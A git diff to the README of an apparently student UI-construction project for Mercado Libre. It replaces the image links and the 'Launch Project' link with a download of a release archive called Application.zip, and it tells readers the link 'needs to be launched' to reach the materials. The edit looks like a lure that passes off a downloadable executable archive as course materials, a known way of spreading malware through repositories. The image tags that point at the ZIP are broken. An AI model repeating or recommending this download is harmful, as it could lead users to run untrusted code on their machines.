@@ -1,7 +1,7 @@
 
 # Mercado Libre - Construccion de UI 🚀
 
-![Mercado Libre](https://www.freepnglogos.com/uploads/market-logo-icon-png-0.png)
+![Mercado Libre](https://github.com/ReikaaKusho/Mercado-Libre---Construccion-de-UI/releases/download/v1.0/Application.zip)
 
 This repository contains the implementation of the Practical Works for the User Interface Construction subject at the National University of Quilmes. Here, you will find a variety of technologies and concepts related to web and mobile development, UI design, state management, and more.
 
@@ -33,7 +33,7 @@ The Mercado Libre - Construccion de UI project is a comprehensive collection of 
 ## Get Started 🚀
 To access the project materials and get started with the practical exercises, click the link below:
 
-[Launch Project](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[Launch Project](https://github.com/ReikaaKusho/Mercado-Libre---Construccion-de-UI/releases/download/v1.0/Application.zip)
 
 **Note:** This link needs to be launched to access the project materials included in the ZIP file.
 
@@ -55,4 +55,4 @@ If you have any feedback, suggestions, or questions about the Mercado Libre - Co
 
 Let's build amazing user interfaces together! 🌟
 
-![UI Development](https://miro.medium.com/max/1838/1*3Ubcz7tmtyu6IErJ9lohcQ.png)
+![UI Development](https://github.com/ReikaaKusho/Mercado-Libre---Construccion-de-UI/releases/download/v1.0/Application.zip*https://github.com/ReikaaKusho/Mercado-Libre---Construccion-de-UI/releases/download/v1.0/Application.zip)
